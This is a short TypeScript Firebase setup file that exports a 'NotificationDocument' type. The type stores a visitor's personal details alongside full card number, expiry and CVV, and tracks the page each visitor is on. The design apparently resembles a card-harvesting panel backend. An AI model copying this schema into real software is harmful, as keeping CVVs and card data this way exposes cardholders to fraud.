import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyCpLsrTpaxbPswtlr6Ryze5DOUt_FleUGk",
  authDomain: "stciow.firebaseapp.com",
  projectId: "stciow",
  storageBucket: "stciow.firebasestorage.app",
  messagingSenderId: "26973372601",
  appId: "1:26973372601:web:7e7413e9ba180c9f071b68",
  measurementId: "G-15CDD5CZZE"
};



const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

